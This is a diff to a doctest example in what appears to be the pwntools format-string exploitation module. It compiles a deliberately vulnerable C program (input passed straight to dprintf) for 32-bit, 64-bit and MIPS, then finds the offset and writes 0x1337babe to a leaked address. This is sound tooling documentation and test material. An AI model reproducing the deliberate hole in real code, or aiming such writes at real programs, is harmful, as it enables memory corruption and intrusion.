@@ -28,24 +28,39 @@ Examples:
     ...        write(1, &my_var, sizeof(int *));
     ...        scanf("%s", buff);
     ...        dprintf(2, buff);
-    ...        write(1, my_var, sizeof(int));
+    ...        write(1, "DONE", 4);
+    ...        write(1, my_var, 4);
     ...        return 0;
     ... }''')
-    >>> cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
+    >>> cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program + ".32"]
+    >>> process(cmdline).wait_for_close()
+    >>> cmdline = ["gcc", source, "-Wno-format-security", "-o", program + ".64"]
+    >>> process(cmdline).wait_for_close()
+    >>> cmdline = ["mips-linux-gnu-gcc", source, "-Wno-format-security", "-o", program + ".mips"]
     >>> process(cmdline).wait_for_close()
     >>> def exec_fmt(payload):
-    ...     p = process(program)
+    ...     p = context.binary.process()
     ...     p.sendline(payload)
     ...     return p.recvall()
     ...
-    >>> autofmt = FmtStr(exec_fmt)
-    >>> offset = autofmt.offset
-    >>> p = process(program, stderr=PIPE)
-    >>> addr = unpack(p.recv(4))
-    >>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
-    >>> p.sendline(payload)
-    >>> print hex(unpack(p.recv(4)))
+    >>> def exploit(binary):
+    ...     context.binary = ELF(binary)
+    ...     autofmt = FmtStr(exec_fmt)
+    ...     offset = autofmt.offset
+    ...     p = context.binary.process()
+    ...     addr = unpack(p.recv(context.bytes))
+    ...     payload = fmtstr_payload(offset, {addr: 0x1337babe})
+    ...     p.sendline(payload)
+    ...     p.recvuntil("DONE")
+    ...     print hex(u32(p.recv(4)))
+    ...
+    >>> exploit(program + ".32")
     0x1337babe
+    >>> exploit(program + ".64")
+    0x1337babe
+    >>> exploit(program + ".mips")
+    0x1337babe
+    >>> context.clear()
 
 Example - Payload generation
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
